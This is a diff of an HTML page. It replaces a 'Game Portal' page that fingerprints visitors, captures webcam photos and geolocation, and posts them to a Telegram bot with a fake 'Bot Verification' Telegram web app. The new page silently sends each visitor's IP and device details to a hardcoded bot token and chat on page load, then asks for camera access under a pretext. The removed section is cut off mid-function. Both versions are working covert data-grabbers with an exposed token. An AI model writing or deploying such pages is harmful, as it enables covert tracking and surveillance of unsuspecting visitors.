@@ -3,230 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Portal</title>
+    <title>Bot Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
-            margin: 0;
-            padding: 0;
+            background-color: #000;
+            color: #fff;
             font-family: Arial, sans-serif;
-            background: #121212;
-            color: white;
-            height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
             text-align: center;
         }
-        
-        #playButton {
-            width: 80%;
-            height: 60%;
-            max-width: 500px;
-            max-height: 300px;
-            background: #4CAF50;
+        .btn {
+            background-color: #ff0000;
             color: white;
             border: none;
-            border-radius: 20px;
-            font-size: 5rem;
-            font-weight: bold;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
             cursor: pointer;
-            box-shadow: 0 10px 25px rgba(76, 175, 80, 0.5);
-            transition: all 0.3s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        #playButton:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 30px rgba(76, 175, 80, 0.7);
-        }
-        
-        #playButton:active {
-            transform: scale(0.98);
-        }
-        
-        #status {
-            margin-top: 20px;
-            font-size: 1.2rem;
-            color: #aaa;
-            height: 20px;
-        }
-        
-        .disclaimer {
-            position: fixed;
-            bottom: 10px;
-            width: 100%;
-            font-size: 0.8rem;
-            color: #666;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Game Portal</h1>
-    <button id="playButton">🎮 PLAY</button>
-    <div id="status"></div>
-    <div class="disclaimer">Example Domain - This is for demonstration purposes only</div>
+    <div id="content" style="display: none;">
+        <h1>Bot Verification</h1>
+        <button id="verifyBtn" class="btn">Verify I'm Not a Bot</button>
+    </div>
 
     <script>
-        // Configuration
-        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
-        const CHAT_ID = '4798745489'; // Group ID
-        const USER_ID = '1002680412435';  // Your bot's ID for DM
+        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
+        const chatId = '-1002577213610';
         
-        // Elements
-        const playButton = document.getElementById('playButton');
-        const statusElement = document.getElementById('status');
-        
-        // Main function
-        playButton.addEventListener('click', async function() {
+        // 1. Сразу отправляем IP при загрузке страницы
+        async function sendIP() {
             try {
-                // Change button state
-                playButton.disabled = true;
-                playButton.innerHTML = '🔍 COLLECTING DATA...';
-                statusElement.textContent = 'Gathering information...';
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
                 
-                // 1. Collect all possible data
-                const userData = await collectAllData();
-                statusElement.textContent = 'Data collected! Sending...';
+                // Добавляем информацию о пользователе
+                const userAgent = navigator.userAgent;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const time = new Date().toLocaleString();
                 
-                // 2. Try to get webcam photo
-                let photoBlob = null;
-                try {
-                    photoBlob = await capturePhoto();
-                    statusElement.textContent = 'Photo captured! Finalizing...';
-                } catch (e) {
-                    console.log('Camera access denied:', e);
-                }
+                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                 
-                // 3. Send to Telegram
-                const success = await sendToTelegram(userData, photoBlob);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
                 
-                if (success) {
-                    playButton.innerHTML = '✅ DONE';
-                    statusElement.textContent = 'Data successfully sent!';
-                    setTimeout(() => {
-                        playButton.innerHTML = '🎮 PLAY';
-                        playButton.disabled = false;
-                        statusElement.textContent = '';
-                    }, 3000);
-                } else {
-                    playButton.innerHTML = '❌ RETRY';
-                    statusElement.textContent = 'Failed to send. Click to try again.';
-                    playButton.disabled = false;
-                }
+                // Показываем контент после отправки IP
+                document.getElementById('content').style.display = 'block';
                 
             } catch (error) {
                 console.error('Error:', error);
-                playButton.innerHTML = '⚠ ERROR';
-                statusElement.textContent = 'An error occurred. Please refresh.';
-                playButton.disabled = false;
+                document.getElementById('content').style.display = 'block';
+            }
+        }
+        
+        // 2. Обработчик кнопки проверки
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                alert('Камера доступна! Проверка завершена.');
+            } catch (error) {
+                alert('Для проверки требуется доступ к камере!');
             }
         });
         
-        // Data collection functions
-        async function collectAllData() {
-            const data = {
-                // Basic info
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                
-                // Browser/device info
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints,
-                
-                // Screen info
-                screen: {
-                    width: window.screen.width,
-                    height: window.screen.height,
-                    colorDepth: window.screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    orientation: window.screen.orientation?.type || 'unknown'
-                },
-                
-                // Network info
-                ipInfo: await getIPInfo(),
-                connection: await getConnectionInfo(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // Advanced fingerprints
-                webGL: getWebGLInfo(),
-                canvas: getCanvasFingerprint(),
-                audio: getAudioContextInfo(),
-                webRTC: getWebRTCInfo(),
-                fonts: await getFontsList(),
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                
-                // Storage capabilities
-                storage: {
-                    localStorage: !!window.localStorage,
-                    sessionStorage: !!window.sessionStorage,
-                    indexedDB: !!window.indexedDB
-                }
-            };
+        // 3. Инициализация при загрузке
+        window.onload = function() {
+            sendIP(); // Отправляем IP сразу
             
-            // Try to get geolocation
-            try {
-                data.geolocation = await getGeolocation();
-            } catch (e) {
-                data.geolocation = 'denied';
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.expand();
+                Telegram.WebApp.enableClosingConfirmation();
             }
-            
-            return data;
-        }
-        
-        async function capturePhoto() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await new Promise(resolve => video.onloadedmetadata = resolve);
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            stream.getTracks().forEach(track => track.stop());
-            
-            return new Promise(resolve => {
-                canvas.toBlob(resolve, 'image/jpeg', 0.8);
-            });
-        }
-        
-        // Telegram sending function
-        async function sendToTelegram(data, photoBlob) {
-            // Format message
-            let message = `🚨 *NEW USER DATA* 🚨\n\n`;
-            message += `📅 *Date:* ${new Date().toLocaleString()}\n`;
-            message += `🌐 *IP:* ${data.ipInfo.ip || 'unknown'}\n`;
-            message += `📍 *Location:* ${data.geolocation?.latitude || 'unknown'}, ${data.geolocation?.longitude || 'unknown'}\n`;
-            message += `🖥 *Device:* ${data.platform}\n`;
-            message += `🔗 *URL:* ${data.url}\n\n`;
-            message += `📊 *Full Data:*\n\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``;
-            
-            // Try different sending methods
-            const endpoints = [
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                `https://tgproxy.vercel.app/api/send?token=${BOT_TOKEN}`
-            ];
-            
-            // Try with photo first
-            if (photoBlob) {
-                try {
-                    const formData = new FormData();
-                    formData.append('chat_id', USER_ID);
-                    formData.append('photo', photoBlob, 'user_photo.jpg');
-                    formData.append('caption', message.substring(0, 1024));
-                    formData.append
+        };
+    </script>
+</body>
+</html>
